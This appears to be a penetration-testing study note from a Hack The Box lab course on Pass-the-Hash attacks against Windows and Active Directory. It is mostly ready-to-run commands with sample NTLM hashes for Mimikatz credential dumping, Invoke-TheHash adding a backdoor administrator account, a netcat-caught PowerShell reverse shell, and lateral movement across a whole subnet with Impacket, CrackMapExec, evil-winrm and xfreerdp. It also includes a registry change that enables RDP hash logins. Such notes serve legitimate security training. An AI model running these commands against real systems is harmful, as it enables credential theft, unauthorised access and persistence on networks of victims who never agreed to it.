==[[Demo PtH]]==

Hashes can be obtained by:
- Dumping the local Sam database from a compromised host [[Attacking SAM]]
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller [[Attacking Active Directory]]
- Pulling the hashes from memory ([lsass.exe](Attacking%20LSASS))

*Examples Use:*
User: julio
Hash: 64F12CDDAA88057E06A81B54E73B949B
Domain: inlanefreight.htb

### Windows New Technology LAN Manager (NTLM) Intro
- A set of security protocols that authenticates users' identities while protecting integrity and confidentiality of data. 
- NTLM is SSO. 
- Kerberos is more common now since Windows 2k
- NTLM passwords are ==not== salted on DCs, allowing PtH attacks

### Pass the Hash with Mimikatz (Windows)
Module: `sekurlsa:pth`
1. */user* - user to impersonate
2. */rc4* or */NTLM* - NTLM hash of password
3. */domain* - Domain the user to impersonate belongs to, or `.` for localhost
4. */run* - The program to run (if not specified `cmd.exe`)

##### Steps:
1. 
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
2. Now use `cmd.exe` as the user
```cmd
whoami
```
3. Profit
```cmd
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```
### Pass the Hash with PowerShell Invoke-TheHash (Windows)
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- Attacks: WMI and SMB
- Local admin isn't required client-side
- Admin is required on target

##### Requirements:
- *Target* - Hostname or IP
- *Username* - Username for authentication
- *Domain* - Domain to use. Unnecessary for local accounts or when using @domain after username
- *Hash* - NTLM hash in ` LM:NTLM` or `NTLM` format
- *Command* - Command to execute on the target. Can leave blank to check for WMI acccess

##### SMB method to add user "Mark" and add him to Administrators:
```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

##### Reverse Shell with WMI:
1. Start Netcat listener
```powershell
.\nc.exe -lvnp 8001
```
2. Create [Reverse Shell](https://www.revshells.com/) using PowerShell as option
3. Paste output from Step 2 into *Command* argument
```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <output>"
```

### PtH with Impacket (Linux)

##### Use PsExec:
```shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

##### Other ways:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### PtH with CrackMapExec (Linux)
Uses "password spraying" as a post exploitation technique to try to authenticate to other hosts on the network. ***This can lock out domain accounts.*** 

```shell
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

- Execute commands with `- x`
```shell
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

##### Auth to all hosts in subnet using local administrator hash:
- Add `--local-auth`
- Useful if we get the ==local administrator== hash by dumping the local SAM database on one host and want to check how many other hosts we can access due to password ==re-use==.

### PtH with evil-winrm (Linux)
- Useful if SMB is blocked or we don't have admin rights

##### Evil-WinRM
```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

### PtH with RDP (Linux)

`xfreerdp`
Caveats:
- *Restricted Admin Mode* - disabled by default, needs to be enabled
	![[Pasted image 20240716192057.png]]
	Add registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

##### xfreerdp
```shell
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### UAC Limits Pass the Hash for Local Accounts
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` = `0`
- Built-in local admin (RID-500, Administrator) is the only local account allowed to preform remote admin tasks
- Set to `1` allows all local admins
`FilterAdministratorToken` = `1` or "Enabled" (Disabled by default)
- RID 500 is enrolled in UAC Protection, remote PtH will fail when using that account
***THESE ONLY APPLY TO LOCAL ADMIN ACCOUNTS, DOMAIN ADMIN WILL STILL BE ABLE TO PASS THE HASH***

